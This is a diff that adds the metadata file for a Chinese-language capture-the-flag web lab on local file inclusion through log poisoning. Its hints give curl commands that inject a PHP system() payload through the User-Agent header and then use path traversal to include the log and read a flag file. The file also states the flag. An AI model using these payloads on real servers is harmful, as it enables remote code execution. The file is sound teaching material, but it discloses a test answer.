@@ -1,0 +1,24 @@
+{
+  "id": "lfi4",
+  "category": "lfi",
+  "title": "带访问日志的官网 · 日志文件包含",
+  "difficulty": "medium",
+  "url_path": "/lfi4",
+  "runtime": "php",
+  "entry": "index.php",
+  "flag": "flag{lfi4_16b7abe3}",
+  "knowledge": [
+    "日志包含 Log Poisoning",
+    "User-Agent 注入",
+    "两步攻击：污染日志→包含日志",
+    "真实场景 /var/log/nginx/access.log"
+  ],
+  "hints": [
+    "UA 会被原样写进 cache/access.log——UA 是请求头里你随便改的",
+    "curl -A \"<?php system('cat /flag_lfi4.txt');?>\" 先污染，再 ?page=../cache/access.log 包含",
+    "curl -A \"<?php system('cat /flag_lfi4.txt');?>\" http://HOST/lfi4/ 然后 curl \"http://HOST/lfi4/?page=../cache/access.log\"（集成：deploy/flag_lfi4.txt 复制到 /，cache/ 需对 php-fpm 可写）"
+  ],
+  "writeup": "writeup.md",
+  "prev": "lfi3",
+  "next": "lfi5"
+}
